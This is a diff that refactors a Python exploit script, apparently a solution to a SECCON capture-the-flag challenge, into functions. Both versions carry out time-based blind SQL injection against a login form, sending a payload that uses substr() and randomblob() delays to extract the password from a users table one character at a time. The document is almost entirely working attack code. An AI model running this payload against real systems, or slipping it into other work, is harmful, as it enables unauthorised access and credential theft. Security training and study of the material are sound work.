@@ -3,45 +3,51 @@
 import requests
 import time
 
-url = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"
-sourcestr = '1234567890abcdef'
-idx = 0
-result = ""
+RESULT = ""
 
-while True:
-    print("[*] CURRENT RESULT: %s" % result)
-    idx += 1
-
+def sqli(url, num, char, delay):
     data = {
-        "user": "test' or substr((select password from users limit 1 offset 0),%d,1)='%s' and randomblob(100000000) and 'a'='a" % (idx, ''),
+        "user": "test' or substr((select password from users limit 1 offset 0),%d,1)='%s' and randomblob(%d00000000) and 'a'='a" % (num, char, delay),
         "pass": "password",
         "login": "Login"
     }
+
     start = time.time()
     res = requests.post(url, data=data)
     ellapse = time.time() - start
 
-    if(ellapse > 1):
-        break
+    if(ellapse > delay):
+        return True
     else:
-        pass
+        return False
 
-    for x in sourcestr:
-        data = {
-            "user": "test' or substr((select password from users limit 1 offset 0),%d,1)='%s' and randomblob(100000000) and 'a'='a" % (idx, x),
-            "pass": "password",
-            "login": "Login"
-        }
-        print("[*] Test: %s" % x)
-        start = time.time()
-        res = requests.post(url, data=data)
-        ellapse = time.time() - start
+def main():
+    global RESULT
+    target = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"
+    sourcestr = '1234567890abcdef'
+    interval = 1
+    idx = 0
 
-        if(ellapse > 1):
-            result += x
-            print("[+] Hit: %s" % x)
+    while True:
+        print("[*] CURRENT RESULT: %s" % RESULT)
+        idx += 1
+
+        if(sqli(target, idx, "", interval)):
             break
         else:
             pass
 
-print("[+] FINAL RESULT: %s" % result)
+        for x in sourcestr:
+            print("[*] Test: %s" % x)
+
+            if(sqli(target, idx, x, interval)):
+                print("[+] HIT: %s" % x)
+                RESULT += x
+                break
+            else:
+                pass
+
+    print("[+] FINAL RESULT: %s" % RESULT)
+
+if __name__ == '__main__':
+    main()
